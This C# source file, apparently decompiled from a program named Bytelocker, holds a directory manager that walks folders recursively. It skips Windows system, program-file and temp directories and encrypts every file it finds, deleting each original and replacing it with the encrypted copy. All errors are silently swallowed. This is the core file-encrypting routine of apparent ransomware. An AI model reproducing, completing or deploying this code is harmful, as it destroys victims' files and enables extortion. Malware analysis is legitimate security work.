using System;
using System.Collections.Generic;
using System.IO;

namespace Bytelocker.CryptoManager;

internal class DirManager
{
	public static List<string> FOLDERS_TO_EXCLUDE = new List<string>
	{
		Environment.GetEnvironmentVariable("windir")!.ToLower(),
		Environment.GetEnvironmentVariable("ProgramData")!.ToLower(),
		Environment.GetEnvironmentVariable("APPDATA")!.ToLower(),
		Environment.GetEnvironmentVariable("LOCALAPPDATA")!.ToLower(),
		(Environment.GetEnvironmentVariable("SystemDrive") + "\\Program Files").ToLower(),
		Environment.GetEnvironmentVariable("TEMP")!.ToLower(),
		Environment.GetEnvironmentVariable("TMP")!.ToLower(),
		(Environment.GetEnvironmentVariable("SystemDrive") + "\\Program Files (x86)").ToLower(),
		"$recycle.bin"
	};

	private string dir_path;

	public void ChooseDir(string dir_path)
	{
		this.dir_path = dir_path;
	}

	public void EncryptDir()
	{
		FileManager fileManager = new FileManager();
		try
		{
			string[] files = Directory.GetFiles(dir_path);
			foreach (string file_path in files)
			{
				fileManager.ChooseFile(file_path);
				fileManager.SetupFileEncrypter();
				if (fileManager.EncryptFile())
				{
					fileManager.DeleteFile();
					fileManager.RenameTmpFileToOrig();
				}
			}
		}
		catch (UnauthorizedAccessException)
		{
		}
		catch (Exception)
		{
		}
	}

	public static List<string> GetFoldersRecursive(string initDir)
	{
		Stack<string> stack = new Stack<string>();
		List<string> list = new List<string>();
		stack.Push(initDir);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			try
			{
				if (!FOLDERS_TO_EXCLUDE.Contains(text.ToLower()))
				{
					list.Add(text);
					string[] directories = Directory.GetDirectories(text);
					foreach (string item in directories)
					{
						stack.Push(item);
					}
				}
			}
			catch (Exception)
			{
			}
		}
		return list;
	}
}
